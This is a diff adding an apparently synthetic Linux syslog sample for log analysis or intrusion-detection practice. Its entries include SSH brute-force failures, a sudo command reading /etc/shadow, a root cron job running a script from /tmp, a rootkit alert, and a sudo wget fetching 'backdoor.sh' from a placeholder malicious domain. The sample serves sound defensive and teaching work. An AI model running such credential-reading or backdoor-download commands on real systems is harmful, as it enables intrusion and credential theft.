@@ -1,0 +1,18 @@
+Jan 18 03:45:12 server-1 sshd[3254]: Accepted password for admin from 192.168.1.101 port 53421 ssh2
+Jan 18 03:50:34 server-1 sshd[3258]: Failed password for root from 203.0.113.50 port 4445 ssh2
+Jan 18 03:51:00 server-1 sshd[3259]: Failed password for root from 203.0.113.50 port 4450 ssh2
+Jan 18 03:51:15 server-1 sshd[3260]: Failed password for root from 203.0.113.50 port 4455 ssh2
+Jan 18 03:51:30 server-1 sshd[3261]: Failed password for root from 203.0.113.50 port 4460 ssh2
+Jan 18 04:00:23 server-1 sudo:    user123 : TTY=pts/1 ; PWD=/home/user123 ; COMMAND=/usr/bin/cat /etc/shadow
+Jan 18 04:05:14 server-1 kernel: [125848.329044] Firewall: IN=eth0 OUT= MAC=00:1a:2b:3c:4d:5e SRC=192.168.1.200 DST=192.168.1.101 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=54321 DF PROTO=TCP SPT=54321 DPT=22 WINDOW=65535 RES=0x00 SYN URGP=0
+Jan 18 04:10:52 server-1 systemd[1]: Starting Cleanup of Temporary Directories...
+Jan 18 04:15:30 server-1 crond[1876]: (root) CMD (/usr/bin/python3 /tmp/suspicious_script.py)
+Jan 18 04:20:10 server-1 audit[4389]: ANOM_ABEND auid=1001 uid=1001 gid=1001 ses=5 pid=4389 comm="apache2" reason="memory corruption" sig=11
+Jan 18 04:25:45 server-1 kernel: [126040.576567] Firewall: IN=eth0 OUT= MAC=00:1a:2b:3c:4d:5e SRC=203.0.113.100 DST=192.168.1.101 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12345 DF PROTO=TCP SPT=52345 DPT=3389 WINDOW=65535 RES=0x00 SYN URGP=0
+Jan 18 04:30:11 server-1 postfix/smtp[2256]: connect to mail.example.com[203.0.113.200]:25: Connection timed out
+Jan 18 04:35:02 server-1 sshd[3280]: Accepted password for root from 192.168.1.150 port 56234 ssh2
+Jan 18 04:40:45 server-1 kernel: [126350.984573] ALERT: Possible rootkit detected - unexpected process running as root: /bin/unknown_proc
+Jan 18 04:45:58 server-1 httpd[874]: [error] [client 203.0.113.120] File does not exist: /var/www/html/admin-panel
+Jan 18 04:50:17 server-1 sudo:    user456 : TTY=pts/3 ; PWD=/home/user456 ; COMMAND=/usr/bin/wget http://malicious-domain.com/backdoor.sh -O /tmp/backdoor.sh
+Jan 18 04:55:12 server-1 kernel: [126650.984573] Firewall: IN=eth0 OUT= MAC=00:1a:2b:3c:4d:5e SRC=203.0.113.150 DST=192.168.1.101 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12355 DF PROTO=TCP SPT=52350 DPT=3389 WINDOW=65535 RES=0x00 SYN URGP=0
+Jan 18 05:00:30 server-1 systemd[1]: Stopping Cleanup of Temporary Directories...
